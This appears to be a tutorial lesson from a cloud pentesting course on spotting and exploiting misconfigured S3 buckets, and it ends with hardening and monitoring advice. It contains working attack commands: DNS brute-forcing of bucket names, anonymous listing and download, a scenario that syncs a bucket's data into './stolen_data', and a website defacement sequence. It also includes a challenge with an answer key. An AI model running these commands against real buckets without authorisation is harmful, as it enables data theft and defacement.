---
title: "S3 Bucket Exploitation"
description: "Learn to identify and exploit misconfigured S3 buckets for data extraction."
difficulty: "Intermediate"
estimatedTime: "45 minutes"
tags: ["cloud-security", "aws", "s3", "data-exposure"]
---

# S3 Bucket Exploitation

<InfoBox type="warning" title="Real-World Impact">
Misconfigured S3 buckets have exposed **billions of records** - from voter data to military files. It's one of the most common and impactful cloud misconfigurations.
</InfoBox>

## Understanding S3 Security

**Simple Storage Service (S3)** is AWS's object storage. Misconfigurations can expose your data to the entire internet.

### S3 Access Control Layers

```
┌─────────────────────────────────────────────────────────┐
│                    S3 ACCESS CONTROL                    │
├─────────────────────────────────────────────────────────┤
│                                                         │
│  1. Account Level (S3 Block Public Access)              │
│     ├── BlockPublicAcls                                 │
│     ├── IgnorePublicAcls                                │
│     ├── BlockPublicPolicy                               │
│     └── RestrictPublicBuckets                           │
│                                                         │
│  2. Bucket Level                                        │
│     ├── Bucket Policy (JSON IAM-like)                   │
│     └── Bucket ACL (Legacy)                             │
│                                                         │
│  3. Object Level                                        │
│     ├── Object ACL                                      │
│     └── Object ownership settings                       │
│                                                         │
└─────────────────────────────────────────────────────────┘
```

---

## Common S3 Misconfigurations

### 1. Public Read Access

<TerminalWindow title="Dangerous Bucket Policy">
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Sid": "PublicRead",
            "Effect": "Allow",
            "Principal": "*",
            "Action": "s3:GetObject",
            "Resource": "arn:aws:s3:::company-backup/*"
        }
    ]
}

# Anyone can read all objects in this bucket!
</TerminalWindow>

### 2. Public List Access

<TerminalWindow title="Listing Exposed">
{
    "Effect": "Allow",
    "Principal": "*",
    "Action": "s3:ListBucket",
    "Resource": "arn:aws:s3:::company-backup"
}

# Attackers can enumerate all files
# Even without public read, knowing filenames is dangerous
</TerminalWindow>

### 3. Public Write Access

<TerminalWindow title="Write Access = Game Over">
{
    "Effect": "Allow",
    "Principal": "*",
    "Action": ["s3:PutObject", "s3:DeleteObject"],
    "Resource": "arn:aws:s3:::website-assets/*"
}

# Attacker can:
# - Replace website files (defacement)
# - Upload malware
# - Delete everything (ransom)
</TerminalWindow>

---

## Discovery Techniques

### Bucket Enumeration

<TerminalWindow title="Finding S3 Buckets">
# Common bucket naming patterns
company-backup
company-prod
company-dev
company.com-assets
companydata

# Tools for discovery
# GrayhatWarfare - S3 bucket search engine
https://buckets.grayhatwarfare.com

# Using AWS CLI (if you have creds)
aws s3 ls s3://bucket-name --no-sign-request

# DNS bruteforce
for word in $(cat wordlist.txt); do
    host "${word}.s3.amazonaws.com" | grep -v "NXDOMAIN"
done

# Subdomain enumeration may reveal bucket names
subfinder -d company.com | grep -i s3
</TerminalWindow>

### Testing Access

<TerminalWindow title="S3 Access Testing">
# Check if bucket exists (no auth)
curl -I https://bucket-name.s3.amazonaws.com

# Try to list contents
aws s3 ls s3://bucket-name --no-sign-request

# Try to download a file
aws s3 cp s3://bucket-name/secret.txt . --no-sign-request

# Check for write access
echo "test" > test.txt
aws s3 cp test.txt s3://bucket-name/ --no-sign-request

# Using curl
curl https://bucket-name.s3.amazonaws.com/?list-type=2
</TerminalWindow>

---

## Tools for S3 Hunting

| Tool | Purpose |
|------|---------|
| **S3Scanner** | Bucket enumeration and access testing |
| **bucket_finder** | Bucket discovery via DNS |
| **AWSBucketDump** | Download all accessible content |
| **Slurp** | S3 bucket permutation scanner |
| **LazyS3** | Bruteforce bucket names |

<TerminalWindow title="Using S3Scanner">
# Install
pip install s3scanner

# Scan from wordlist
s3scanner --bucket company-backup

# Scan from list of potential names
s3scanner --bucket-file buckets.txt

# Dump accessible files
s3scanner --bucket company-backup --dump
</TerminalWindow>

---

## Real-World Attack Scenarios

### Scenario 1: Data Exfiltration

<TerminalWindow title="Stealing Backup Data">
# 1. Found public bucket via subdomain enum
# backup.company.com → company-backup.s3.amazonaws.com

# 2. List contents
aws s3 ls s3://company-backup --no-sign-request --recursive

# OUTPUT:
# 2026-01-01 12:00:00  1.2GB database-dump-2026.sql
# 2026-01-01 12:00:00  500MB customer-data.csv
# 2026-01-01 12:00:00  50MB  credentials.json

# 3. Download everything
aws s3 sync s3://company-backup ./stolen_data --no-sign-request
</TerminalWindow>

### Scenario 2: Website Defacement

<TerminalWindow title="Modifying Public Website">
# 1. Website hosted on S3 with write access
# company.com → company-website.s3.amazonaws.com

# 2. Download index.html
aws s3 cp s3://company-website/index.html . --no-sign-request

# 3. Modify the file
echo "HACKED BY PENTEST TEAM" > index.html

# 4. Upload modified file
aws s3 cp index.html s3://company-website/ --no-sign-request

# Website is now defaced!
</TerminalWindow>

---

<ChallengeBox 
  title="S3 Bucket Hunt"
  difficulty="medium"
  points={150}
>

You're testing a company called "TechStartup Inc" (techstartup.io). Find potential S3 buckets:

**Given Information**:
- Main domain: techstartup.io
- They use AWS
- Company was founded in 2024

**Tasks**:
1. List 5 potential bucket names to test
2. What command would you use to test read access?
3. If you find write access to their website bucket, what's the ethical response?

<details>
<summary>Answer</summary>

**1. Potential Bucket Names**:
- techstartup
- techstartup-prod
- techstartup-backup
- techstartup.io
- techstartup-assets
- techstartup-dev
- techstartup-uploads
- techstartup-2024

**2. Test Read Access**:
```bash
aws s3 ls s3://techstartup --no-sign-request
aws s3 ls s3://techstartup-backup --no-sign-request
```

**3. Ethical Response**:
- **DO NOT** modify any files
- Document the finding with screenshots
- Report immediately to the client
- Include remediation steps (enable Block Public Access)
- This is a **critical** finding

</details>
</ChallengeBox>

---

## Defense & Detection

### Enable Block Public Access

<TerminalWindow title="Secure S3 Configuration">
# Enable Block Public Access (Account Level)
aws s3control put-public-access-block \
    --account-id 123456789012 \
    --public-access-block-configuration \
    "BlockPublicAcls=true,IgnorePublicAcls=true,BlockPublicPolicy=true,RestrictPublicBuckets=true"

# Enable for specific bucket
aws s3api put-public-access-block \
    --bucket my-bucket \
    --public-access-block-configuration \
    "BlockPublicAcls=true,IgnorePublicAcls=true,BlockPublicPolicy=true,RestrictPublicBuckets=true"
</TerminalWindow>

### CloudTrail Monitoring

Monitor for:
- `PutBucketPolicy` with Principal: "*"
- `PutBucketAcl` granting public access
- `DeleteBucketPolicy` (removing protections)
- `GetObject` from unexpected IPs

---

## Key Takeaways

- S3 misconfigurations are **extremely common** and **high impact**
- Always test with `--no-sign-request` to check public access
- **Block Public Access** is your first line of defense
- Enable **CloudTrail** and alert on policy changes
- During pentests, **never modify** production data

<Quiz
  question="What AWS feature should be enabled at the account level to prevent all S3 buckets from being made public?"
  options={[
    "VPC Endpoints",
    "S3 Block Public Access",
    "AWS Shield",
    "S3 Object Lock"
  ]}
  correctIndex={1}
  explanation="S3 Block Public Access at the account level prevents any bucket in the account from being made publicly accessible, even if someone tries to set a public policy."
/>
